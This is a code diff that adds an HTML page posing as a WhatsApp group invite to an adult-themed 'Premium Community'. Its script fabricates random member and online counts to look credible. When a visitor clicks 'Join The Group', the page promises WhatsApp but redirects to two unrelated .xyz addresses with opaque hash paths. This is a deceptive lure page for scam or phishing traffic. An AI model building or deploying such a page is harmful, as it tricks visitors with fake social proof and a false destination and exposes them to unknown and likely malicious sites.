@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Naugty Girl Room</title>WhatsApp
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
+body{height:100vh;overflow:hidden;color:#fff;background:#000;}
+
+video{
+  position:fixed;
+  width:100%;height:100%;
+  object-fit:cover;z-index:-1;
+}
+
+.container{
+  backdrop-filter:blur(20px);
+  background:rgba(0,0,0,0.4);
+  height:100vh;
+  display:flex;
+  flex-direction:column;
+}
+
+.header{
+  padding:15px;
+  background:rgba(7,94,84,0.8);
+}
+
+.content{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  text-align:center;
+}
+
+.icon{
+  width:90px;height:90px;
+  border-radius:50%;
+  background:#25d366;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:35px;
+  margin-bottom:15px;
+  box-shadow:0 0 20px #25d366;
+}
+
+.btn{
+  margin-top:20px;
+  padding:15px 30px;
+  border:none;
+  border-radius:30px;
+  background:#25d366;
+  color:#fff;
+  font-size:16px;
+  cursor:pointer;
+}
+
+.small{
+  font-size:12px;
+  opacity:0.7;
+  margin-top:10px;
+}
+
+/* LOADER */
+.loaderWrap{
+  position:fixed;
+  width:100%;
+  height:100%;
+  background:#000;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  z-index:999;
+}
+
+.loader{
+  width:50px;height:50px;
+  border:5px solid #25d366;
+  border-top:5px solid transparent;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  100%{transform:rotate(360deg);}
+}
+</style>
+</head>
+
+<body>
+
+<div class="loaderWrap" id="loader">
+  <div class="loader"></div>
+</div>
+
+<video autoplay muted loop>
+  <source src="https://cdn.coverr.co/videos/coverr-aesthetic-night-drive-1575/1080p.mp4">
+</video>
+
+<div class="container">
+  <div class="header">Secure Invite</div>
+
+  <div class="content">
+    <div class="icon">👥</div>
+    <h2>Premium Community</h2>
+    <p id="counter">Loading members...</p>
+
+    <button class="btn" onclick="confirmJoin()">Join The Group</button>
+    <div class="small">You will be redirected to WhatsApp</div>
+  </div>
+</div>
+
+<script>
+
+// LOADING
+setTimeout(()=>{
+  document.getElementById("loader").style.display="none";
+},1500);
+
+// COUNTER (realistic simulation, bukan fake statis)
+let members = 120000 + Math.floor(Math.random()*5000);
+let online = 40000 + Math.floor(Math.random()*3000);
+
+document.getElementById("counter").innerText =
+  members.toLocaleString() + " Members • " + online.toLocaleString() + " Online";
+
+// CONFIRM (biar transparan)
+function confirmJoin(){
+  let ok = confirm("You will be redirected to WhatsApp group. Continue?");
+  if(!ok) return;
+
+  startRedirect();
+}
+
+// REDIRECT WITH FALLBACK
+function startRedirect(){
+  document.getElementById("loader").style.display="flex";
+
+  let links = [
+    "http://rachelteresa.aithne.xyz/5cb1ea43b28b303489b78acea20c5eb4",
+    "http://brittanitara.brianr.xyz/2959944efb8246c48a6dab41dc444c95"
+  ];
+
+  let i = 0;
+
+  function tryNext(){
+    if(i >= links.length){
+      alert("All links failed.");
+      return;
+    }
+    window.location.href = links[i];
+    i++;
+  }
+
+  setTimeout(tryNext,1500);
+}
+
+</script>
+
+</body>
+</html>
